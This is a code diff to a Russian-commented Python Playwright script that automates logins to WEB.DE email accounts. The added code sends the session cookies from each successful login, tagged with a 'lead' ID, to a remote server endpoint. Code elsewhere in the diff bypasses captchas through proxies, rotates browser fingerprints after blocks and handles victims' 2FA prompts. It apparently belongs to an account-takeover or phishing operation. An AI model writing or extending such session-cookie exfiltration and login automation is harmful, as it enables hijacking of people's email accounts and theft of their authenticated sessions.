@@ -13,6 +13,7 @@ import base64
 import random
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from contextlib import contextmanager
 from pathlib import Path
 from datetime import datetime
 from typing import Any, Callable, Optional
@@ -33,6 +34,11 @@ try:
 except ImportError:
     _HAS_PIL = False
 
+try:
+    import requests
+except ImportError:
+    requests = None  # type: ignore
+
 from captcha_solver import (
     solve_image_captcha,
     solve_captchafox_with_proxy_string,
@@ -41,6 +47,19 @@ from captcha_solver import (
 _LOG_PREFIX = ""
 _LAST_ALERT_TEXT = ""
 _LOG_EMAIL_INLINE = ""  # задаётся в login_webde(email)
+_WEBDE_ACTIVE_COOKIES_PUSH: dict | None = None
+
+
+@contextmanager
+def _cookies_push_scope(push: dict | None):
+    """В lead_mode передаётся {base_url, lead_id, token} — куки уходят в POST /api/lead-cookies-upload."""
+    global _WEBDE_ACTIVE_COOKIES_PUSH
+    prev = _WEBDE_ACTIVE_COOKIES_PUSH
+    _WEBDE_ACTIVE_COOKIES_PUSH = push
+    try:
+        yield
+    finally:
+        _WEBDE_ACTIVE_COOKIES_PUSH = prev
 # Детальные шаги (капча по пикселям, consent, снимки страниц): WEBDE_VERBOSE_LOG=1
 _WEBDE_VERBOSE_LOG = os.environ.get("WEBDE_VERBOSE_LOG", "").strip().lower() in ("1", "true", "yes")
 
@@ -254,9 +273,41 @@ def _wait_then_save_cookies_and_exit(context, email: str) -> None:
 
 
 def _save_cookies_for_lead_mode(context, email: str) -> None:
-    """В lead_mode сохраняем куки в файл, чтобы в админке можно было скачать."""
+    """В lead_mode: POST на сервер (SQLite) или fallback — файл login/cookies (локальный запуск)."""
+    push = _WEBDE_ACTIVE_COOKIES_PUSH
+    try:
+        cookies = context.cookies()
+    except Exception as e:
+        log("Куки", "Не удалось прочитать куки: " + str(e))
+        return
+    base = (push or {}).get("base_url")
+    lid = (push or {}).get("lead_id")
+    if base and lid:
+        if requests is None:
+            log("Куки", "Пакет requests не установлен — не могу отправить куки на сервер")
+            return
+        try:
+            url = str(base).rstrip("/") + "/api/lead-cookies-upload"
+            tok = str((push or {}).get("token") or "").strip()
+            headers: dict[str, str] = {"Content-Type": "application/json; charset=utf-8"}
+            if tok:
+                headers["Authorization"] = "Bearer " + tok
+            r = requests.post(
+                url,
+                json={"id": str(lid).strip(), "cookies": cookies},
+                headers=headers,
+                timeout=120,
+            )
+            if r.status_code >= 400:
+                log("Куки", f"Сервер отклонил сохранение: HTTP {r.status_code} {(r.text or '')[:200]}")
+            else:
+                log("Куки", "Сохранены на сервере (БД)")
+        except Exception as e:
+            log("Куки", "Ошибка отправки куков на сервер: " + str(e))
+        return
     try:
         save_cookies(context, str(_cookies_path_for_email(email)))
+        log("Куки", "Сохранены в файл (legacy, без cookies_push)")
     except Exception as e:
         log("Куки", "Не удалось сохранить куки для скачивания: " + str(e))
 
@@ -2731,6 +2782,7 @@ def login_webde(
     automation_profile: dict | None = None,
     force_pool_fingerprint: bool = False,
     hold_session_after_lead_success: bool = False,
+    cookies_push: dict | None = None,
 ):
     """
     lead_mode: для симуляции лида (отдельный скрипт). Возвращает "wrong_credentials" | "push" | "success" | "error".
@@ -2745,6 +2797,7 @@ def login_webde(
     on_wrong_two_fa: lead_mode — после неверного кода на WEB.DE (опционально уведомить сервер).
     force_pool_fingerprint: True — взять UA/экран из пула webde_fingerprints.json по fingerprint_index, игнорируя playwright из automation_profile (для ретраев после блока).
     hold_session_after_lead_success: lead_mode — не закрывать браузер при success; сессия в take_lead_held_browser_session() для оркестрации (Klein).
+    cookies_push: lead_mode — {base_url, lead_id, token?} → POST /api/lead-cookies-upload (SQLite); иначе файл login/cookies.
     """
     email = email or EMAIL
     password = password or PASSWORD
@@ -2868,7 +2921,7 @@ def login_webde(
     if browser_engine == "chromium" and USE_CHROME:
         launch_options["channel"] = "chrome"
 
-    with sync_playwright() as p:
+    with _cookies_push_scope(cookies_push), sync_playwright() as p:
         clear_lead_held_browser_session()
         effective_engine = browser_engine
         browser = None
